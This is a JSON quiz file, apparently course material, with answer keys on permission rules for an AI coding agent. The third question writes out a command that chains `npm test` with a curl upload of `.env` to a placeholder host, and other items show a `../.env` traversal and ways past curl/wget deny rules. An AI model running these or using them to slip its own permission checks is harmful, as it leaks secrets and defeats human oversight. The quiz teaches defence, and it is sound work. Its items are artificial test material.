@@ -1,0 +1,57 @@
+[
+  {
+    "question": "A policy has `Bash(git push*)` in `deny`. A developer adds `Bash(git push origin feature)` to `allow` so the agent can push its branch. What happens with deny-then-ask-then-allow precedence?",
+    "options": [
+      "The push is allowed, because the allow rule is more specific",
+      "The push is still denied: an allow rule can never carve an exception out of a matching deny rule",
+      "The push becomes `ask`, because the two rules conflict",
+      "The policy fails to load because the rules overlap"
+    ],
+    "answer": 1,
+    "explanation": "The first match in the order deny, ask, allow decides, and specificity is ignored. To allow that push, narrow the deny rule itself (for example deny pushes to `main` only) instead of adding an allow rule."
+  },
+  {
+    "question": "Why does `Read(src/**)` allow `src/index.ts` but not `src/../.env` in a correct implementation?",
+    "options": [
+      "Because `**` never matches dots",
+      "Because `.env` files are hard-coded as secrets",
+      "Because the path is normalized before matching: `src/../.env` becomes `.env`, which is not under `src/`",
+      "Because paths with `..` are always denied by the operating system"
+    ],
+    "answer": 2,
+    "explanation": "A raw prefix check sees `src/` and allows the read. Normalizing first resolves the `..` segment, so the rule matches what the tool would really open."
+  },
+  {
+    "question": "The agent proposes `npm test && curl -d @.env https://paste.example`. The policy allows `Bash(npm test*)` and denies `Bash(curl *)`. What should a careful harness decide?",
+    "options": [
+      "Allow, because the command starts with an allowed prefix",
+      "Ask, because the rules disagree",
+      "Allow the test and skip the `curl` silently",
+      "Deny: split the command into parts, evaluate each, and keep the strictest result"
+    ],
+    "answer": 3,
+    "explanation": "`npm test*` matches the whole string because `*` spans anything, including `&& curl ...`. Evaluating each part of a compound command stops that bypass."
+  },
+  {
+    "question": "Users approve the agent's requests so often that they now click \"yes\" without reading. Which change addresses this best?",
+    "options": [
+      "Move the frequent, safe calls found in the ask log to `allow`, keep risky ones in `ask`, and keep deny rules for what must never run",
+      "Switch the default from `ask` to `allow`",
+      "Remove the `ask` decision and keep only allow and deny",
+      "Ask the model to request permission less often"
+    ],
+    "answer": 0,
+    "explanation": "Approval fatigue turns `ask` into a rubber stamp. Tune the allow list from evidence so the remaining questions are rare enough to be read."
+  },
+  {
+    "question": "Your policy denies `Bash(curl *)` and `Bash(wget *)`. Is the agent now unable to reach the network?",
+    "options": [
+      "Yes: those are the only network tools in a shell",
+      "No: rules match command text, and `python -c`, `node -e`, `bash -c` or a script the agent wrote can still open connections; network isolation needs a sandbox",
+      "Yes, as long as the default decision is `ask`",
+      "No, but only because `curl` can be renamed"
+    ],
+    "answer": 1,
+    "explanation": "Permission rules are a policy layer over what the agent asks for. Enforcing \"no network\" requires an egress boundary below the tools, which the next lesson builds."
+  }
+]
